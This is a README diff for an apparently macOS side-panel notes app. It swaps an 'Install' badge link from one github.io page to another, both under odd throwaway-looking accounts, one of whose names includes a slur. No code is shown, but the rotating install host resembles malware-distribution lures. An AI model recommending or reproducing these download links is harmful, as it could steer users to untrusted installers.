@@ -13,7 +13,7 @@
 
 ---
 
-| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://xoxli-pidorasy-entertainment.github.io/.github/sidenotes) | **Native side panel notes and snippets built for professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
+| [![Install](https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png)](https://jornal-gens.github.io/.github/sidenotes) | **Native side panel notes and snippets built for professionals** <br><br> No setup, no friction. Built on macOS frameworks, runs natively on Intel and Apple Silicon with powerful tools designed for everyday professional use. |
 |---|---|
 
 ---
